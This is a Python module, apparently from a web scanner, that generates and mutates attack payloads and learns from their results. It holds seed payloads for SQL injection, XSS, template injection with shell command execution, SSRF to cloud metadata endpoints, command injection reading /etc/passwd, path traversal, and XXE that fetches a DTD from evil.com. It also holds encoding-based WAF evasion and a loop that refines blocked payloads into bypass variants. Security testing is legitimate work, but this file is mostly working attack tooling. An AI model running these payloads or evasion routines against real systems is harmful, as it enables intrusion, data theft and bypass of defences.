"""
Layer 3 — Self-Learning Payload Generator
===========================================
Context-aware, mutation-driven, spec-aware payload engine with a learning loop.

Unlike static payload lists, this generator:
    1. Analyzes the target context (technology, framework, WAF, encoding)
    2. Selects seed payloads from the Spec Abuse KB
    3. Applies context-aware mutations
    4. Records outcomes → abstract the successful logic → generate variants
    5. Shares learned patterns across all scan modules

Learning Loop:
    Successful exploit →
    Abstract the attack logic →
    Store as pattern signature →
    Generate new variants from the abstraction →
    Reuse across future scans

Integration points:
    - PayloadMutator (existing) for encoding/case/whitespace mutations
    - PayloadContextDetector (existing) for injection context
    - SpecAbuseKnowledgeBase for spec-level patterns
    - ContinuousLearningMemory for persistence
"""

from __future__ import annotations

import base64
import hashlib
import html
import json
import logging
import random
import re
import time
import urllib.parse
import uuid
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

logger = logging.getLogger("neo.payload_generator")


# ─────────────────────────────────────────────
# Data models
# ─────────────────────────────────────────────

@dataclass
class PayloadCandidate:
    """A generated payload with full context metadata."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:12])
    payload: str = ""
    category: str = ""           # sqli, xss, ssti, ssrf, cmdi, etc.
    context: str = ""            # html_body, js_string, sql_query, url_param, etc.
    mutation_chain: List[str] = field(default_factory=list)  # mutations applied
    seed_pattern_id: str = ""    # source spec abuse pattern
    target_technology: str = ""
    target_parser: str = ""
    estimated_confidence: float = 0.5
    waf_evasion_level: int = 0   # 0=none, 1=basic, 2=advanced, 3=elite
    tags: List[str] = field(default_factory=list)
    generated_at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class LearningOutcome:
    """Records the outcome of a payload execution for learning."""
    payload_id: str
    payload: str
    category: str
    target_url: str = ""
    target_parameter: str = ""
    succeeded: bool = False
    response_code: int = 0
    response_time_ms: float = 0.0
    was_reflected: bool = False
    was_executed: bool = False
    was_blocked: bool = False
    blocking_mechanism: str = ""  # waf, filter, encoding
    detection_signature: str = ""
    mutation_chain: List[str] = field(default_factory=list)
    context: str = ""
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class PayloadDNA:
    """
    Abstracted attack logic — the "DNA" of a successful payload.
    Used to generate novel variants that share the same attack principle.
    """
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    attack_principle: str = ""       # e.g., "break out of string context then inject tag"
    required_escapes: List[str] = field(default_factory=list)  # e.g., ["'", '"', ">"]
    injection_vector: str = ""       # e.g., "attribute_value", "script_src"
    interpreter_target: str = ""     # e.g., "sql", "html", "javascript", "shell"
    critical_tokens: List[str] = field(default_factory=list)  # e.g., ["UNION", "SELECT"]
    success_contexts: List[str] = field(default_factory=list)  # contexts where this works
    failure_contexts: List[str] = field(default_factory=list)  # contexts where this fails
    mutation_preferences: List[str] = field(default_factory=list)  # preferred mutations
    success_count: int = 0
    generation_count: int = 0

    def fitness_score(self) -> float:
        if self.generation_count == 0:
            return 0.5  # neutral for new DNA
        return self.success_count / self.generation_count


# ─────────────────────────────────────────────
# Mutation strategies
# ─────────────────────────────────────────────

class _MutationEngine:
    """Applies intelligent mutations to payloads based on context."""

    @staticmethod
    def url_encode(payload: str, aggressive: bool = False) -> str:
        if aggressive:
            return "".join(f"%{ord(c):02x}" for c in payload)
        return urllib.parse.quote(payload, safe="")

    @staticmethod
    def double_url_encode(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    @staticmethod
    def html_encode(payload: str) -> str:
        return html.escape(payload)

    @staticmethod
    def html_entity_hex(payload: str) -> str:
        return "".join(f"&#x{ord(c):x};" for c in payload)

    @staticmethod
    def unicode_escape(payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def unicode_fullwidth(payload: str) -> str:
        result = []
        for c in payload:
            cp = ord(c)
            if 0x21 <= cp <= 0x7E:
                result.append(chr(cp + 0xFEE0))
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def hex_encode(payload: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def octal_encode(payload: str) -> str:
        return "".join(f"\\{ord(c):03o}" for c in payload)

    @staticmethod
    def case_alternating(payload: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))

    @staticmethod
    def null_byte_inject(payload: str) -> str:
        return payload + "%00"

    @staticmethod
    def comment_obfuscate(payload: str) -> str:
        """Insert SQL-style comments between tokens."""
        return re.sub(r"\s+", "/**/", payload)

    @staticmethod
    def concat_split(payload: str) -> str:
        """Split strings using concatenation."""
        if len(payload) < 4:
            return payload
        mid = len(payload) // 2
        return f"CONCAT('{payload[:mid]}','{payload[mid:]}')"

    @staticmethod
    def tab_replace(payload: str) -> str:
        return payload.replace(" ", "\t")

    @staticmethod
    def newline_replace(payload: str) -> str:
        return payload.replace(" ", "\n")

    @staticmethod
    def plus_replace(payload: str) -> str:
        return payload.replace(" ", "+")

    @staticmethod
    def scientific_notation(payload: str) -> str:
        """Replace numbers with scientific notation."""
        return re.sub(r"\b(\d+)\b", lambda m: f"{m.group(1)}e0", payload)

    @staticmethod
    def json_unicode_escape(payload: str) -> str:
        return json.dumps(payload)[1:-1]  # Remove surrounding quotes

    @staticmethod
    def reverse_payload(payload: str) -> str:
        return payload[::-1]

    @staticmethod
    def chunk_encode(payload: str, chunk_size: int = 3) -> str:
        """Split into Transfer-Encoding chunks."""
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        return "\r\n".join(f"{len(c):x}\r\n{c}" for c in chunks) + "\r\n0\r\n\r\n"


# ── Mutation operator registry
_MUTATIONS: Dict[str, Callable[[str], str]] = {
    "url_encode": _MutationEngine.url_encode,
    "double_url_encode": _MutationEngine.double_url_encode,
    "html_encode": _MutationEngine.html_encode,
    "html_entity_hex": _MutationEngine.html_entity_hex,
    "unicode_escape": _MutationEngine.unicode_escape,
    "unicode_fullwidth": _MutationEngine.unicode_fullwidth,
    "base64": _MutationEngine.base64_encode,
    "hex": _MutationEngine.hex_encode,
    "octal": _MutationEngine.octal_encode,
    "case_alternating": _MutationEngine.case_alternating,
    "null_byte": _MutationEngine.null_byte_inject,
    "comment_obfuscate": _MutationEngine.comment_obfuscate,
    "concat_split": _MutationEngine.concat_split,
    "tab_replace": _MutationEngine.tab_replace,
    "newline_replace": _MutationEngine.newline_replace,
    "plus_replace": _MutationEngine.plus_replace,
    "scientific_notation": _MutationEngine.scientific_notation,
    "json_unicode": _MutationEngine.json_unicode_escape,
    "reverse": _MutationEngine.reverse_payload,
}


# ── Context → preferred mutations mapping
_CONTEXT_MUTATIONS: Dict[str, List[str]] = {
    "html_body": ["html_encode", "html_entity_hex", "unicode_fullwidth", "case_alternating"],
    "html_attribute": ["html_encode", "html_entity_hex", "url_encode", "unicode_escape"],
    "javascript": ["unicode_escape", "hex", "octal", "base64", "case_alternating"],
    "sql_query": ["comment_obfuscate", "concat_split", "url_encode", "case_alternating",
                  "scientific_notation", "tab_replace", "null_byte"],
    "url_param": ["url_encode", "double_url_encode", "unicode_fullwidth", "null_byte"],
    "command": ["tab_replace", "newline_replace", "base64", "hex", "null_byte"],
    "template": ["unicode_escape", "html_entity_hex", "url_encode"],
    "json_body": ["json_unicode", "unicode_escape", "base64"],
    "xml_body": ["html_entity_hex", "html_encode", "unicode_escape"],
    "header_value": ["url_encode", "unicode_escape", "tab_replace"],
}


# ─────────────────────────────────────────────
# Self-Learning Payload Generator
# ─────────────────────────────────────────────

class SelfLearningPayloadGenerator:
    """
    Generates context-aware, mutation-driven payloads that learn from outcomes.

    Flow:
        1. Select seed payload based on target context
        2. Apply context-appropriate mutations
        3. Execute payload
        4. Record outcome
        5. If successful: extract DNA, generate variants
        6. If blocked: identify blocking mechanism, apply evasion mutations

    The generator maintains a library of PayloadDNA — abstracted attack
    patterns extracted from successful exploits. New payloads are generated
    by recombining DNA with context-specific mutations.
    """

    def __init__(self):
        self._dna_library: Dict[str, PayloadDNA] = {}
        self._outcomes: List[LearningOutcome] = []
        self._blocking_patterns: Dict[str, List[str]] = defaultdict(list)
        self._success_cache: Dict[str, List[str]] = defaultdict(list)  # context → payloads
        self._generated_count = 0
        self._success_count = 0
        self._blocked_count = 0
        self._load_seed_dna()

    def _load_seed_dna(self):
        """Load initial DNA patterns from known attack archetypes."""

        self._add_dna(PayloadDNA(
            id="dna_sqli_union",
            attack_principle="Break out of string context using quotes, then UNION SELECT to extract data",
            required_escapes=["'", '"'],
            injection_vector="sql_value",
            interpreter_target="sql",
            critical_tokens=["UNION", "SELECT", "FROM"],
            success_contexts=["sql_query"],
            mutation_preferences=["comment_obfuscate", "case_alternating", "concat_split"],
        ))

        self._add_dna(PayloadDNA(
            id="dna_sqli_blind_time",
            attack_principle="Inject time-delay function to confirm SQL execution via response timing",
            required_escapes=["'"],
            injection_vector="sql_value",
            interpreter_target="sql",
            critical_tokens=["SLEEP", "WAITFOR", "DELAY", "pg_sleep", "BENCHMARK"],
            success_contexts=["sql_query"],
            mutation_preferences=["comment_obfuscate", "case_alternating"],
        ))

        self._add_dna(PayloadDNA(
            id="dna_xss_tag_break",
            attack_principle="Break out of HTML attribute/tag context, inject new script tag or event handler",
            required_escapes=['"', "'", ">", "<"],
            injection_vector="html_attribute",
            interpreter_target="html",
            critical_tokens=["<script>", "onerror", "onload", "onfocus", "onmouseover"],
            success_contexts=["html_attribute", "html_body"],
            mutation_preferences=["case_alternating", "html_entity_hex", "unicode_fullwidth"],
        ))

        self._add_dna(PayloadDNA(
            id="dna_xss_event_handler",
            attack_principle="Inject event handler in HTML attribute context without breaking tag",
            required_escapes=['"', "'"],
            injection_vector="html_attribute",
            interpreter_target="javascript",
            critical_tokens=["onmouseover", "onfocus", "autofocus", "onerror"],
            success_contexts=["html_attribute"],
            mutation_preferences=["html_encode", "unicode_escape"],
        ))

        self._add_dna(PayloadDNA(
            id="dna_ssti_math",
            attack_principle="Inject template expression that evaluates math to confirm code execution",
            required_escapes=["{", "}"],
            injection_vector="template_expression",
            interpreter_target="template",
            critical_tokens=["{{", "}}", "${", "<%"],
            success_contexts=["template"],
            mutation_preferences=["unicode_escape", "url_encode"],
        ))

        self._add_dna(PayloadDNA(
            id="dna_cmdi_semicolon",
            attack_principle="Terminate current command with separator, inject new command",
            required_escapes=[";", "|", "&", "`", "$"],
            injection_vector="command_argument",
            interpreter_target="shell",
            critical_tokens=[";", "|", "&&", "||", "`", "$("],
            success_contexts=["command"],
            mutation_preferences=["tab_replace", "newline_replace", "null_byte"],
        ))

        self._add_dna(PayloadDNA(
            id="dna_ssrf_internal",
            attack_principle="Redirect server-side HTTP request to internal/metadata endpoint",
            required_escapes=[],
            injection_vector="url_parameter",
            interpreter_target="http_client",
            critical_tokens=["http://", "169.254.169.254", "127.0.0.1", "localhost", "metadata"],
            success_contexts=["url_param"],
            mutation_preferences=["url_encode", "double_url_encode"],
        ))

        self._add_dna(PayloadDNA(
            id="dna_path_traversal",
            attack_principle="Use directory traversal sequences to access files outside intended path",
            required_escapes=[".", "/", "\\"],
            injection_vector="file_path",
            interpreter_target="filesystem",
            critical_tokens=["../", "..\\", "%2e%2e", "%252e%252e"],
            success_contexts=["url_param", "file_path"],
            mutation_preferences=["url_encode", "double_url_encode", "null_byte"],
        ))

    def _add_dna(self, dna: PayloadDNA):
        self._dna_library[dna.id] = dna

    # ── Payload Generation ────────────────────────────────────────

    def generate_payloads(
        self,
        category: str,
        context: str = "",
        technology: str = "",
        waf_evasion_level: int = 0,
        max_payloads: int = 50,
        seed_payloads: Optional[List[str]] = None,
    ) -> List[PayloadCandidate]:
        """
        Generate context-aware payloads for a specific attack category.

        Args:
            category: Attack type (sqli, xss, ssti, ssrf, cmdi, path_traversal, etc.)
            context: Injection context (html_body, sql_query, url_param, etc.)
            technology: Target technology stack
            waf_evasion_level: 0=none, 1=basic, 2=advanced, 3=elite
            max_payloads: Maximum payloads to generate
            seed_payloads: Optional seed payloads to mutate

        Returns:
            List of PayloadCandidate objects
        """
        candidates = []

        # Step 1: Get seed payloads
        seeds = seed_payloads or self._get_seed_payloads(category)

        # Step 2: Check if we have successful payloads for this context
        cache_key = f"{category}:{context}:{technology}"
        if cache_key in self._success_cache:
            cached = self._success_cache[cache_key]
            for payload in cached[:5]:
                candidates.append(PayloadCandidate(
                    payload=payload,
                    category=category,
                    context=context,
                    target_technology=technology,
                    estimated_confidence=0.9,
                    tags=["cached_success"],
                ))

        # Step 3: Get relevant DNA patterns
        dna_patterns = self._get_relevant_dna(category, context)

        # Step 4: Generate from DNA + mutations
        for dna in dna_patterns:
            dna_payloads = self._generate_from_dna(dna, context, technology, waf_evasion_level)
            for payload in dna_payloads:
                candidates.append(PayloadCandidate(
                    payload=payload,
                    category=category,
                    context=context,
                    seed_pattern_id=dna.id,
                    target_technology=technology,
                    estimated_confidence=dna.fitness_score() * 0.8,
                    waf_evasion_level=waf_evasion_level,
                    tags=["dna_generated"],
                ))

        # Step 5: Mutate seed payloads
        preferred_mutations = self._get_mutations_for_context(context, waf_evasion_level)
        for seed in seeds:
            for mutation_name in preferred_mutations:
                mutator = _MUTATIONS.get(mutation_name)
                if mutator:
                    try:
                        mutated = mutator(seed)
                        if mutated and mutated != seed:
                            candidates.append(PayloadCandidate(
                                payload=mutated,
                                category=category,
                                context=context,
                                mutation_chain=[mutation_name],
                                target_technology=technology,
                                estimated_confidence=0.5,
                                waf_evasion_level=waf_evasion_level,
                                tags=["mutated"],
                            ))
                    except Exception:
                        pass

        # Step 6: Multi-layer mutations for WAF evasion
        if waf_evasion_level >= 2:
            for seed in seeds[:10]:
                for m1 in preferred_mutations[:3]:
                    for m2 in preferred_mutations[3:6]:
                        try:
                            stage1 = _MUTATIONS.get(m1, lambda x: x)(seed)
                            stage2 = _MUTATIONS.get(m2, lambda x: x)(stage1)
                            if stage2 and stage2 != seed:
                                candidates.append(PayloadCandidate(
                                    payload=stage2,
                                    category=category,
                                    context=context,
                                    mutation_chain=[m1, m2],
                                    target_technology=technology,
                                    estimated_confidence=0.4,
                                    waf_evasion_level=2,
                                    tags=["double_mutated", "waf_evasion"],
                                ))
                        except Exception:
                            pass

        # Deduplicate and limit
        seen = set()
        deduplicated = []
        for c in candidates:
            if c.payload not in seen:
                seen.add(c.payload)
                deduplicated.append(c)

        # Sort by confidence
        deduplicated.sort(key=lambda c: c.estimated_confidence, reverse=True)
        result = deduplicated[:max_payloads]

        self._generated_count += len(result)
        return result

    def _get_seed_payloads(self, category: str) -> List[str]:
        """Get base seed payloads for a category."""
        seeds = {
            "sqli": [
                "' OR '1'='1", "' OR '1'='1'--", "1' AND 1=1--",
                "' UNION SELECT NULL,NULL,NULL--", "1 OR 1=1",
                "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "' OR 1=1#", "admin'--",
                "1' ORDER BY 1--", "1' ORDER BY 10--",
                "') OR ('1'='1", '" OR "1"="1"--',
                "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            ],
            "xss": [
                '<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
                "javascript:alert(1)", "'><svg onload=alert(1)>",
                '<img src=x onerror="alert(1)">', "<body onload=alert(1)>",
                '"><script>alert(document.domain)</script>',
                "'-alert(1)-'", "{{constructor.constructor('alert(1)')()}}",
                '"><details open ontoggle=alert(1)>',
                '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
                "<svg/onload=alert(1)>",
            ],
            "ssti": [
                "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
                "{{7*'7'}}", "{{config}}", "{{config.__class__.__init__.__globals__}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{self.__class__.__mro__[2].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1/", "http://localhost/",
                "http://0x7f000001/", "http://2130706433/",
                "http://[::1]/", "http://0177.0.0.1/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "file:///etc/passwd", "dict://127.0.0.1:11211/stat",
                "gopher://127.0.0.1:6379/_INFO",
                "http://169.254.169.254.nip.io/latest/meta-data/",
            ],
            "cmdi": [
                "; id", "| id", "& id", "&& id", "|| id",
                "$(id)", "`id`", ";cat /etc/passwd",
                "| cat /etc/passwd", "& type C:\\windows\\system32\\drivers\\etc\\hosts",
                "$(cat /etc/passwd)", "; ping -c 5 127.0.0.1",
                "; sleep 5", "| sleep 5",
                "%0aid", "${IFS}id",
            ],
            "path_traversal": [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd", "..%252f..%252f..%252fetc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%00/etc/passwd", "..%0d/etc/passwd",
                "/etc/passwd%00.jpg", "....\\\\....\\\\....\\\\etc\\\\passwd",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
                "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><root/>',
            ],
            "nosql": [
                '{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}',
                "admin' || '1'=='1", '{"username": {"$regex": "^a"}}',
                '[$ne]=1', '{"$where": "this.password.match(/.*/)"}',
            ],
            "ldap": [
                ")(objectClass=*)", "*)(&", "*)(|(cn=*)",
                "admin)(&))", "*)(&(objectclass=*)",
            ],
        }
        return seeds.get(category, seeds.get("sqli", []))

    def _get_relevant_dna(self, category: str, context: str) -> List[PayloadDNA]:
        """Get DNA patterns relevant to the attack category and context."""
        category_to_interpreter = {
            "sqli": "sql", "xss": "html", "ssti": "template",
            "cmdi": "shell", "ssrf": "http_client", "path_traversal": "filesystem",
        }
        interpreter = category_to_interpreter.get(category, "")

        relevant = []
        for dna in self._dna_library.values():
            if dna.interpreter_target == interpreter:
                relevant.append(dna)
            elif context and context in dna.success_contexts:
                relevant.append(dna)

        # Sort by fitness
        relevant.sort(key=lambda d: d.fitness_score(), reverse=True)
        return relevant[:5]

    def _generate_from_dna(
        self,
        dna: PayloadDNA,
        context: str,
        technology: str,
        waf_level: int,
    ) -> List[str]:
        """Generate payloads from DNA pattern."""
        payloads = []

        # Build payload from DNA components
        if dna.interpreter_target == "sql":
            for token_set in [
                ["'", " UNION ", "SELECT", " NULL,@@version", "--"],
                ["'", " AND ", "SLEEP(5)", "--"],
                ["'", " OR ", "'1'='1", "--"],
                ["1", " ORDER BY ", "1", "--"],
            ]:
                if all(t in dna.critical_tokens or not t.strip() for t in token_set):
                    payloads.append("".join(token_set))

            # Technology-specific
            if "mysql" in technology.lower():
                payloads.extend([
                    "' AND SLEEP(5)-- -",
                    "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -",
                ])
            elif "postgres" in technology.lower():
                payloads.extend([
                    "' AND pg_sleep(5)--",
                    "' UNION SELECT NULL,version(),NULL--",
                ])
            elif "mssql" in technology.lower():
                payloads.extend([
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' UNION SELECT NULL,@@version,NULL--",
                ])

        elif dna.interpreter_target == "html":
            for escape in dna.required_escapes:
                for token in dna.critical_tokens:
                    payloads.append(f"{escape}{token}")

        elif dna.interpreter_target == "shell":
            separators = [s for s in dna.required_escapes if s in (";", "|", "&", "`", "$")]
            for sep in separators:
                payloads.append(f"{sep}id")
                payloads.append(f"{sep}cat /etc/passwd")
                payloads.append(f"{sep}sleep 5")

        elif dna.interpreter_target == "http_client":
            payloads.extend([
                "http://127.0.0.1/",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]/",
                "http://0x7f000001/",
            ])

        elif dna.interpreter_target == "template":
            payloads.extend([
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{config}}",
            ])

        dna.generation_count += len(payloads)
        return payloads

    def _get_mutations_for_context(self, context: str, waf_level: int) -> List[str]:
        """Get preferred mutations for a given context and WAF level."""
        base = _CONTEXT_MUTATIONS.get(context, ["url_encode", "case_alternating"])

        if waf_level == 0:
            return base[:3]
        elif waf_level == 1:
            return base[:5]
        elif waf_level == 2:
            return base + ["null_byte", "unicode_fullwidth"]
        else:  # elite
            return list(_MUTATIONS.keys())

    # ── Learning ─────────────────────────────────────────────────

    def record_outcome(self, outcome: LearningOutcome):
        """
        Record a payload execution outcome and update the learning model.

        If successful:
          - Extract DNA from the payload
          - Cache for future use
          - Increase fitness of related DNA patterns

        If blocked:
          - Record blocking signature
          - Decrease fitness of related patterns
          - Generate evasion variants
        """
        self._outcomes.append(outcome)

        if outcome.succeeded:
            self._success_count += 1
            # Cache successful payload
            cache_key = f"{outcome.category}:{outcome.context}:{outcome.target_url}"
            self._success_cache[cache_key].append(outcome.payload)

            # Update DNA fitness
            for dna in self._dna_library.values():
                if any(token.lower() in outcome.payload.lower() for token in dna.critical_tokens):
                    dna.success_count += 1
                    if outcome.context and outcome.context not in dna.success_contexts:
                        dna.success_contexts.append(outcome.context)

            # Extract new DNA if it's a novel pattern
            self._try_extract_dna(outcome)

        elif outcome.was_blocked:
            self._blocked_count += 1
            if outcome.blocking_mechanism:
                self._blocking_patterns[outcome.blocking_mechanism].append(outcome.payload)

            # Update DNA failure contexts
            for dna in self._dna_library.values():
                if outcome.context and outcome.context not in dna.failure_contexts:
                    for token in dna.critical_tokens:
                        if token.lower() in outcome.payload.lower():
                            dna.failure_contexts.append(outcome.context)
                            break

    def _try_extract_dna(self, outcome: LearningOutcome):
        """Try to extract a new DNA pattern from a successful exploitation."""
        payload = outcome.payload

        # Identify critical tokens
        tokens = []
        # SQL tokens
        sql_keywords = ["UNION", "SELECT", "SLEEP", "WAITFOR", "AND", "OR", "FROM", "WHERE", "ORDER"]
        for kw in sql_keywords:
            if kw.lower() in payload.lower():
                tokens.append(kw)
        # HTML tokens
        html_tokens = ["<script", "onerror", "onload", "svg", "img", "body", "alert"]
        for tok in html_tokens:
            if tok.lower() in payload.lower():
                tokens.append(tok)
        # Shell tokens
        shell_tokens = [";", "|", "&&", "||", "`", "$("]
        for tok in shell_tokens:
            if tok in payload:
                tokens.append(tok)

        if tokens:
            dna_id = f"dna_learned_{hashlib.md5(payload.encode()).hexdigest()[:8]}"
            if dna_id not in self._dna_library:
                new_dna = PayloadDNA(
                    id=dna_id,
                    attack_principle=f"Learned pattern from successful {outcome.category} exploitation",
                    critical_tokens=tokens,
                    interpreter_target=self._guess_interpreter(outcome.category),
                    success_contexts=[outcome.context] if outcome.context else [],
                    mutation_preferences=outcome.mutation_chain,
                    success_count=1,
                    generation_count=1,
                )
                self._add_dna(new_dna)
                logger.info(f"Extracted new DNA pattern: {dna_id} from {outcome.category} success")

    def _guess_interpreter(self, category: str) -> str:
        mapping = {
            "sqli": "sql", "xss": "html", "ssti": "template",
            "cmdi": "shell", "ssrf": "http_client",
            "path_traversal": "filesystem", "xxe": "xml",
        }
        return mapping.get(category, "unknown")

    def generate_evasion_variants(self, blocked_payload: str, blocking_mechanism: str) -> List[str]:
        """Generate payload variants designed to evade a specific blocking mechanism."""
        variants = []

        if blocking_mechanism in ("waf", "waf_filter"):
            # WAF evasion: heavy encoding, case mutation, comment injection
            for mutation in ["double_url_encode", "unicode_fullwidth", "case_alternating",
                           "comment_obfuscate", "null_byte", "tab_replace"]:
                mutator = _MUTATIONS.get(mutation)
                if mutator:
                    try:
                        variants.append(mutator(blocked_payload))
                    except Exception:
                        pass

            # Multi-layer encoding
            try:
                v1 = _MutationEngine.url_encode(blocked_payload)
                v2 = _MutationEngine.case_alternating(v1)
                variants.append(v2)
            except Exception:
                pass

        elif blocking_mechanism in ("input_filter", "sanitization"):
            # Try encoding bypass
            for mutation in ["unicode_escape", "html_entity_hex", "hex", "octal", "base64"]:
                mutator = _MUTATIONS.get(mutation)
                if mutator:
                    try:
                        variants.append(mutator(blocked_payload))
                    except Exception:
                        pass

        elif blocking_mechanism == "content_type_filter":
            # Content-type confusion
            variants.append(blocked_payload)  # try same payload with different content-type

        return [v for v in variants if v and v != blocked_payload]

    # ── Statistics ────────────────────────────────────────────────

    def get_stats(self) -> Dict[str, Any]:
        return {
            "dna_patterns": len(self._dna_library),
            "total_generated": self._generated_count,
            "total_successes": self._success_count,
            "total_blocked": self._blocked_count,
            "outcomes_recorded": len(self._outcomes),
            "success_rate": self._success_count / max(1, len(self._outcomes)),
            "cached_contexts": len(self._success_cache),
            "blocking_mechanisms_seen": len(self._blocking_patterns),
            "top_dna": sorted(
                [(dna.id, dna.fitness_score()) for dna in self._dna_library.values()],
                key=lambda x: x[1], reverse=True,
            )[:5],
        }

    def to_dict(self) -> Dict[str, Any]:
        return {
            "dna_library": {k: asdict(v) for k, v in self._dna_library.items()},
            "stats": self.get_stats(),
            "recent_outcomes": [o.to_dict() for o in self._outcomes[-20:]],
        }


# ── Singleton ─────────────────────────────────────────────────────

_generator: Optional[SelfLearningPayloadGenerator] = None


def get_payload_generator() -> SelfLearningPayloadGenerator:
    global _generator
    if _generator is None:
        _generator = SelfLearningPayloadGenerator()
    return _generator
